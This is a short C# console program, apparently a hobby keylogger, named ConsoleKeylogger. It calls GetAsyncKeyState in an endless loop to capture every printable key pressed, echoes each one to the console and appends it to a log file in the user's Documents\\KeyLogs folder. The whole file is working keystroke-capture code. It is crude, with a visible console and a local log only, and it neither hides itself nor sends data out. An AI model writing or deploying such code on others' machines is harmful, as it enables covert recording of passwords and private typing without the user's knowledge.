using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;

namespace ConsoleKeylogger
{
    class Initializer
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static string log = "";
        

        static void Main(string[] args)
        {
            string docupath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(docupath + "\\KeyLogs"))
            {
                Directory.CreateDirectory(docupath + "\\KeyLogs");
            }

            DateTime now = DateTime.Now;

            Console.WriteLine(now.ToString());

            string logpath = docupath + "\\KeyLogs\\log " + ".txt";
            
            if (!File.Exists(logpath))
            {
                using (StreamWriter sw = File.CreateText(logpath))
                {

                }
            }

            while (true)
            {
                Thread.Sleep(5);

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32768)
                    {
                        Console.WriteLine((char)i + ", ");

                        using (StreamWriter sw = File.AppendText(logpath))
                        {
                            sw.Write((char) i);
                        }
                    }
                }
            }
        }
    }
}
